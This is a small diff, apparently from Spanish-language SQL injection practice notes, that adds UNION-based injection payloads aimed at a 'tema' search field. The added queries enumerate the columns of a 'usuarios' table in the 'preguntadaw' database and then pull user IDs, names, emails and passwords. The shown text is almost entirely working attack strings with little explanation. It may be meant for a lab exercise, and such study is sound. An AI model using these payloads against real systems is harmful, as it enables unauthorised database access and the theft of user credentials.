@@ -93,5 +93,15 @@ UNION
 SELECT column_name, data_type, 0, 0, 0, 0 FROM information_schema.columns 
 WHERE table_name = 'tema' -- '
 
+-- 4.5. Sacar las columnas de la tabla Usuarios de la bd Preguntadaw
+SELECT * FROM tema WHERE nombre ='' 
+UNION 
+SELECT column_name, 0, 0, 0, 0, 0 FROM information_schema.columns 
+WHERE table_name = 'usuarios' AND table_schema = 'preguntadaw' -- '
+
+--4.6. Sacar usuarios de la bd preguntadaw (tabla usuarios)
+SELECT * FROM tema WHERE nombre ='' 
+UNION 
+SELECT idUsuario, nombre, email,contrasenia, 0, 0, 0 FROM usuarios -- '
 
 
